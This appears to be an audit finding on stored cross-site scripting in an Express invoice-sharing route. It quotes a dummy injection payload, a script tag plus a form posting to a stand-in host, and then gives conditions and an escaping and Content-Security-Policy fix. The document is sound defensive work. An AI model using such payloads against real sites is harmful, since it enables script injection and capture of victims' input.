**Observed:** In the built-in harness reproducing the verbatim source expressions, customer '<b>DUMMY-CUST</b>' was rendered as '&lt;b&gt;DUMMY-CUST&lt;/b&gt;'. The notes payload appeared verbatim as '<div class="notes"><script>document.title="DUMMY-MARKER"</script><form action="https://dummy.invalid/x"><input name=p></form></div>' in the string body, which Express sends as text/html. Script execution in a browser was not observed.

### Conditions and containment

- *authentication_level*: The attacker needs any member account. Self-registration through POST /api/auth/register creates member accounts.
- *user_interaction*: A victim must open the /i/<share_token> link, which the attacker controls and distributes.
- *system_configuration*: Script execution, as opposed to markup injection, assumes no blocking Content-Security-Policy is added outside the repository, for example by a reverse proxy or CDN. The application source sets none.

### Remediation

HTML-encode notes, and any future template field, with the existing esc() helper at the output point. Optionally also set a restrictive Content-Security-Policy (for example default-src 'none'; style-src 'self') and X-Content-Type-Options: nosniff on the public share route as defense in depth.

`src/routes/share.js`:
```js
  res.set('Content-Security-Policy', "default-src 'none'");
  res.set('X-Content-Type-Options', 'nosniff');
  res.send(`<!doctype html><html><head><title>Invoice #${esc(inv.id)}</title></head><body>
  <h1>Invoice for ${esc(inv.customer)}</h1>
  <p>Amount: ${(inv.amount_cents / 100).toFixed(2)}</p>
  <div class="notes">${esc(inv.notes)}</div>
  </body></html>`);
```

Linked coverage units: share-html

---
